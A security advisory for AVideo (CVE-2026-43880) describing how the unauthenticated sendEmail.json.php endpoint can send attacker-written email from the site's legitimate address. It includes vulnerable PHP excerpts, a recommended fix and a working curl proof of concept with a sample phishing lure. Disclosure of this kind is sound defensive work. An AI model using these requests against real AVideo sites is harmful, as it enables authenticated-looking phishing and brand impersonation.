# [M] AVideo: Unauthenticated Arbitrary Email Sending via sendEmail.json.php Enables Phishing from the Site’s Legitimate From Address

## Summary
Severity: Medium
Advisory: GHSA-5hgj-7gm9-cff5
CVE: CVE-2026-43880
CWE: CWE-940
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N (CVSS_V3)
Published: 2026-05-05
Source: https://github.com/advisories/GHSA-5hgj-7gm9-cff5
Type: github-advisory

## Affected
- Packagist: `wwbn/avideo` — affected >=0

## Details
## Summary

`objects/sendEmail.json.php` exposes two branches depending on whether `contactForm=1` is submitted. When the parameter is omitted, the endpoint sets `$sendTo` to an attacker-supplied email and, for unauthenticated callers, uses the site's own contact email as the message `From:`/`Reply-To:`. The endpoint is explicitly allow-listed as a "public write action" in `objects/functionsSecurity.php` (line 885), so it requires no authentication or CSRF token. An unauthenticated attacker (solving a captcha) can force the site's own SMTP infrastructure to send attacker-composed emails to arbitrary recipients with the site's legitimate sender address, passing SPF/DKIM/DMARC for the site's domain — ideal for targeted phishing and brand impersonation.

## Details

**Vulnerable code (`objects/sendEmail.json.php`):**

```php
10: $valid = Captcha::validation(@$_POST['captcha']);
11: if(User::isAdmin()){
12:     $valid = true;
13: }
...
16: if ($valid) {
...
24:     $mail = new \PHPMailer\PHPMailer\PHPMailer();
25:     setSiteSendMessage($mail);           // uses site's SMTP credentials
...
30:     $replyTo = User::getEmail_();
31:     if (empty($replyTo)) {
32:         $replyTo = $config->getContactEmail();   // <-- FALLBACK to site's own email
33:     }
34:
35:     $sendTo = $_POST['email'];            // attacker-controlled recipient
36:
37:     // if it is from contact form send the message to the siteowner and the sender is the email on the form field
38:     if (!empty($_POST['contactForm'])) {
39:         $replyTo = $_POST['email'];
40:         $sendTo  = $config->getContactEmail();
41:     }
42:
43:     if (filter_var($sendTo, FILTER_VALIDATE_EMAIL)) {
44:         $mail->AddReplyTo($replyTo);       // site's address
45:         $mail->setFrom($replyTo);          // From: site's address
...
47:         $mail->addAddress($sendTo);        // TO: attacker-chosen victim
...
49:         $safeFirstName = htmlspecialchars($_POST['first_name'], ENT_QUOTES, 'UTF-8');
50:         $mail->Subject = 'Message From Site ' . $config->getWebSiteTitle() . " ({$safeFirstName})";
51:         $mail->msgHTML($msg);
...
55:         if (!$mail->send()) { ... }
```

**`User::getEmail_()` (`objects/user.php:345-352`):** returns `''` when the caller is not logged in, driving the fallback to `$config->getContactEmail()`.

**Endpoint is publicly callable.** `objects/functionsSecurity.php:879-918` lists `sendEmail.json.php` in the built-in "public write actions" CSRF/same-domain bypass:

```php
static $builtinBypass = [
    ...
    // Public write actions
    'sendEmail.json.php',
    ...
];
if (in_array($baseName, $builtinBypass, true)) { return; }
```

**Why existing defenses don't mitigate the abuse:**
- **Captcha** (`Captcha::validation`): costs one solve per email. Manual solves remain viable for targeted phishing, and a separate captcha-bypass primitive in this codebase (tracked separately) automates abuse.
- **`FILTER_VALIDATE_EMAIL`** (line 43): validates `$sendTo` format, preventing CRLF/header injection, but does not verify that the sender is authorized to send to that address.
- **`htmlspecialchars` on `$safeEmail`/`$safeComment`/`$safeFirstName`**: blocks HTML injection in the rendered message but does not prevent phishing content — attacker fully controls the visible text (URL, instructions) and the perceived sender.
- **No rate limiting, no auth check, no association between the caller and the recipient address.**

**Flow summary for the abuse case (unauthenticated, no `contactForm`):**
1. `User::getEmail_()` → `''`, so `$replyTo` = site's contact email (line 32)
2. `$sendTo` = attacker's chosen recipient (line 35)
3. `contactForm` branch skipped (line 38)
4. Site's SMTP sends `From: <site contact>` to `<victim>` with attacker's subject/body (lines 44-51)

Because the message is genuinely relayed by the site's mail infrastructure, SPF/DKIM/DMARC for the site's domain pass, making the phishing message indistinguishable from legitimate site mail.

## PoC

Endpoint: `POST /objects/sendEmail.json.php` (also reachable via `POST /sendEmail` per `.htaccess:201`).

```bash
# 1. Obtain a session + captcha image
curl -c cookies.txt -s 'http://target.example.com/captcha.php?refresh=1' -o captcha.png
# attacker manually solves the captcha -> e.g. 'abc123'

# 2. Send phishing email. Note: contactForm is OMITTED.
#    - User::getEmail_() returns '' (unauth) -> $replyTo falls back to site's contact email
#    - $sendTo = attacker-chosen recipient
#    - setFrom($replyTo) -> From: is the site's real address
curl -b cookies.txt -s -X POST 'http://target.example.com/objects/sendEmail.json.php' \
  --data-urlencode 'captcha=abc123' \
  --data-urlencode 'email=victim@target.com' \
  --data-urlencode 'first_name=Support Team' \
  --data-urlencode 'comment=Urgent: Your account will be suspended. Please verify at http://attacker.example.com/reset'
```

Expected server response:
```json
{"error":"","success":"Message sent"}
```

Delivered headers at `victim@target.com`:
```
From: <site's legitimate contact email, e.g. contact@legit-videosite.com>
Reply-To: <site's legitimate contact email>
To: victim@target.com
Subject: Message From Site <SiteName> (Support Team)
Body:   <b>Email:</b> victim@target.com<br><br>Urgent: Your account will be suspended...
```

Contrast with the intended `contactForm=1` flow (correctly routes to the site owner):
```bash
curl -b cookies.txt -s -X POST 'http://target.example.com/objects/sendEmail.json.php' \
  --data-urlencode 'captcha=<newcaptcha>' \
  --data-urlencode 'email=attacker@attacker.com' \
  --data-urlencode 'comment=hi' \
  --data-urlencode 'contactForm=1'
# -> $sendTo = site owner's contact email; $replyTo = attacker's email. (Normal contact form.)
```

Omitting `contactForm` inverts the routing and turns the endpoint into an unauthenticated sender-for-hire using the site's own From: identity.

## Impact

- **Phishing with the site's real sender identity.** Mail originates from the site's SMTP, so SPF/DKIM/DMARC pass; the message is indistinguishable from legitimate site communications and bypasses inbox anti-phishing heuristics.
- **Brand impersonation / account-takeover chains.** Attacker-controlled subject (`first_name`) and body (`comment`) support credential-harvesting pages that appear to come from the site operator.
- **Mail-reputation damage.** Repeated abuse can blacklist the site's sending IP/domain, degrading legitimate mail deliverability.
- **Works against any AVideo instance with SMTP configured** — a default deployment after the admin configures SMTP for standard notifications. No privileged position, credentials, or non-default flags required.

## Recommended Fix

Collapse the endpoint to contact-owner-only behavior and require either authentication or `contactForm=1`. Minimal patch:

```php
// objects/sendEmail.json.php
...
$valid = Captcha::validation(@$_POST['captcha']);
if (User::isAdmin()) {
    $valid = true;
}

// Reject the non-contactForm branch for unauthenticated callers.
// The "share with a friend" flow already requires User::isLogged()
// in the UI (view/.../functiongetShareMenu.php), so enforce it here too.
if (empty($_POST['contactForm']) && !User::isLogged()) {
    $obj = new stdClass();
    $obj->error = __("Authentication required");
    header('Content-Type: application/json');
    echo json_encode($obj);
    exit;
}

$obj = new stdClass();
$obj->error = '';
if ($valid) {
    ...
    $replyTo = User::getEmail_();
    if (empty($replyTo)) {
        // Should no longer be reachable for arbitrary recipients.
        // Keep as defense-in-depth only for contactForm=1 path.
        $replyTo = $config->getContactEmail();
    }
    ...
}
```

Additional hardening:
1. Always use a dedicated `no-reply@` address in `setFrom()`; put the caller's address only in `Reply-To`. Never reuse `$config->getContactEmail()` as the From for user-initiated messages.
2. For the logged-in "share" flow, verify the caller's email has been confirmed, and rate-limit by user id and by IP.
3. Drop the non-`contactForm` branch entirely if no legitimate unauthenticated UI caller remains.
4. Add a visible "user-submitted message via our site" banner to the email body so recipients can distinguish these from first-party communications.

## References
- https://github.com/WWBN/AVideo/security/advisories/GHSA-5hgj-7gm9-cff5
- https://nvd.nist.gov/vuln/detail/CVE-2026-43880
- https://github.com/WWBN/AVideo/commit/4e3709895857a5857f0edb46b0ee984de0d9e1a2
- https://github.com/WWBN/AVideo
